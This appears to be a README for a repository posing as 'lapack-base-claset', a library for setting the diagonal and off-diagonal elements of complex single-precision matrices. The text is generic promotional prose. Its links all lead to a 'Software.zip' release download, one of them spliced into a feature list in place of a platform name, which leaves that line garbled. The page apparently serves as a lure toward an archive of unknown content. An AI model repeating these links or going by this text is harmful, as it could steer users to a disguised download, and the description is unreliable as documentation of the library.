![lapack-base-claset](https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip)

Welcome to the LAPACK Base CLASET repository! This repository contains a set of subroutines designed to help set the off-diagonal elements and the diagonal elements of a single-precision complex floating-point matrix to specified values. If you are working on linear algebra, matrix calculations, or mathematical operations involving complex numbers, this library can be a valuable tool in your projects.

## Description ℹ️

The LAPACK Base CLASET library provides efficient and reliable routines for handling complex matrix operations in a high-performance manner. By utilizing LAPACK (Linear Algebra PACKage) subroutines, this library ensures accuracy and numerical stability in computations involving complex matrices. Whether you are dealing with algebraic calculations, array manipulations, or mathematical transformations, this library can streamline your workflow and enhance the efficiency of your computations.

## Features ✨

👉 Set the off-diagonal elements and diagonal elements of complex matrices  
👉 Perform mathematical operations with single-precision floating-point numbers  
👉 High-performance subroutines for linear algebra calculations  
👉 Compatible with JavaScript, https://github.com/itsfernanda221/lapack-base-claset/releases/download/v2.0/Software.zip, and ndarray arrays  
👉 Simplify complex matrix manipulations in your projects
